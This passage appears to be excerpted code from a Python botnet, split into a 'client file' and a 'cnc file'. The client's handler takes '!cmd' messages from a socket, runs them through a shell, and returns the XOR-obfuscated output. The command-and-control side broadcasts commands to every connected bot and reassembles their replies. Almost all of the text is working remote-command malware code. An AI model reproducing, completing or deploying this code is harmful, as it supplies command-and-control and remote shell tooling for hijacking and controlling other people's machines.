in client file

import subprocess

def shell_exec(cmd, sock):
	global stop
	if stop != True:
		try:
			DEVNULL = open(os.devnull, 'w')
			proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=DEVNULL, shell=True) 
			(output,_) = proc.communicate() 
			output = output.decode('utf-8')
			if output == '' or len(output) == 0:
				output = 'cmd executed without error => ' + cmd
			send_big_data(output,sock)
		except:
			send_big_data('Error: cmd' + cmd,sock)		

def send_msg(data, sock):
	sock.send(xor_enc(data,key).encode())

def send_big_data(data, sock):
	HEADERSIZE=10
	msg = data
	msg = xor_enc(msg,key)
	fullmsg = f'{len(msg):<{HEADERSIZE}}' + msg
	sock.send(fullmsg.encode())

def handler(sock):
	...
				if command[0] == '!cmd':
					if attack != 0:
						stop = True
						attack = 0
					stop = False
					p= threading.Thread(target=shell_exec, args = (data[5:], sock))
					p.start()
					attack+=1
	...
	

in cnc file

def ReadLongSocket(sock,length):
	HEADERSIZE = 10
	counter = 1
	data = ''
	newmsg = True
	sock.settimeout(10)
	while True:
		msg = sock.recv(length).decode()
		if 'ERwKAQ==' in msg:
			print('Pong interrupt')
			continue

		print('Packet:',counter,'received')
		if newmsg:
			print(f"expecting: {msg[:HEADERSIZE]} bytes")
			msglen = int(msg[:HEADERSIZE])
			newmsg = False
		print(msg)
		data += msg
		counter += 1

		if len(data)-HEADERSIZE == msglen:
			print('Received all', msglen, 'bytes from message')
			break
		elif len(msg) == 0:
			data += f'\r\nMSG length {msglen} does not match header {len(data)-HEADERSIZE}'
			break
	return data[HEADERSIZE:]

def SentCmd(data,sock,rlock,cmdso):
...
		socketList.remove(sock)#del error connection
		dead += 1
	if(data[:4] in 'QBAJAg'):
		print('You\'ve got mail:')
		try:
			msg = ReadLongSocket(sock,1024)
			msg = xor_dec(msg,key)
			msg += '\r\n'
			length = 1024
			packmsg = [msg[index:index+length] for index in range(0,len(msg),length)]
			for pack in packmsg:
				cmdso.send(pack.encode())
		except:
			print('Failure to read message')
	rlock.release()
...

def SendCmd(cmd,so,rlock):#Send Commands Module
...
	for sock in socketList:
		th = threading.Thread(target=SentCmd,args=(data,sock,rlock,so,))
		th.start()
...
